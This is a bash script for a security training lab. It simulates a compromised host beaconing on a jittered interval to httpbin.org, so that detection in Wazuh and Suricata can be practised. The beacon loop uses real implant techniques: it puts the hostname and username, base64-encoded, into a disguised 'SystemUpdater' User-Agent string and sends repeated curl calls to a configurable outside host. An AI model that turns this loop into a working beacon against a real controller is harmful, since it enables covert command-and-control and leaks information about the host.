#!/usr/bin/env bash
# Lab 6 — C2 Beaconing Simulation
# Simulates a compromised host beaconing to a C2 server on a jittered interval.
# Runs continuously until MAX_BEACONS reached or Ctrl+C.
# Safe: all traffic goes to httpbin.org.

BEACON_HOST="${BEACON_HOST:-httpbin.org}"
BEACON_PATH="/get"
BEACON_INTERVAL="${BEACON_INTERVAL:-20}"   # seconds between beacons
JITTER="${JITTER:-5}"                       # ± random seconds
MAX_BEACONS="${MAX_BEACONS:-15}"            # stop after N beacons
LOG_FILE="/tmp/lab6-beacon.log"
TAG="lab6-c2-beacon"

YLW='\033[1;33m'
RED='\033[0;31m'
GRN='\033[0;32m'
NC='\033[0m'

cleanup() {
  logger -t "$TAG" "CLEANUP: removing beacon log $LOG_FILE"
  rm -f "$LOG_FILE"
  echo -e "${GRN}[cleanup] Beacon log removed.${NC}"
}

if [[ "${1:-}" == "--cleanup" ]]; then
  cleanup
  exit 0
fi

echo -e "${YLW}[lab6] C2 beacon simulation starting${NC}"
echo -e "  Target   : https://${BEACON_HOST}${BEACON_PATH}"
echo -e "  Interval : ${BEACON_INTERVAL}s ± ${JITTER}s jitter"
echo -e "  Max      : ${MAX_BEACONS} beacons"
echo -e "  PID      : $$"
echo ""
echo -e "${RED}Run this in the background, then switch to Wazuh and Suricata.${NC}"
echo -e "${RED}Ctrl+C or kill $$ to stop early.${NC}"
echo ""

# ── Implant start ─────────────────────────────────────────────────────────────
logger -t "$TAG" "STAGE:IMPLANT_START beacon interval=${BEACON_INTERVAL}s jitter=${JITTER}s max=${MAX_BEACONS}"
echo "beacon_start=$(date -u +%Y-%m-%dT%H:%M:%SZ) pid=$$" >> "$LOG_FILE"

# ── Beacon loop ───────────────────────────────────────────────────────────────
count=0
while [[ $count -lt $MAX_BEACONS ]]; do
  count=$((count + 1))
  ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

  # Encode implant ID in User-Agent (hostname:username, base64)
  implant_id=$(echo -n "$(hostname):${USER:-victim}" | base64 | tr -d '=\n')
  ua="Mozilla/5.0 (compatible; SystemUpdater/${implant_id})"

  # Next interval with jitter (pre-calculate so we can log it)
  jitter_val=$(( (RANDOM % (JITTER * 2 + 1)) - JITTER ))
  next_sleep=$(( BEACON_INTERVAL + jitter_val ))
  next_sleep=$(( next_sleep < 5 ? 5 : next_sleep ))

  logger -t "$TAG" "BEACON:${count}/${MAX_BEACONS} ts=${ts} next_in=${next_sleep}s dst=${BEACON_HOST}"

  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    -A "$ua" \
    --max-time 10 \
    "https://${BEACON_HOST}${BEACON_PATH}?seq=${count}&ts=$(date +%s)" 2>/dev/null || echo "000")

  logger -t "$TAG" "BEACON_RESPONSE:${count} status=${http_code}"
  echo "${ts} beacon=${count}/${MAX_BEACONS} status=${http_code} next=${next_sleep}s" | tee -a "$LOG_FILE"

  if [[ $count -lt $MAX_BEACONS ]]; then
    sleep "$next_sleep"
  fi
done

logger -t "$TAG" "STAGE:IMPLANT_DONE total_beacons=${MAX_BEACONS} complete"
echo -e "${GRN}[lab6] Beacon sequence complete (${MAX_BEACONS} beacons sent)${NC}"
echo -e "${YLW}Now check Suricata and Wazuh for the beaconing pattern.${NC}"
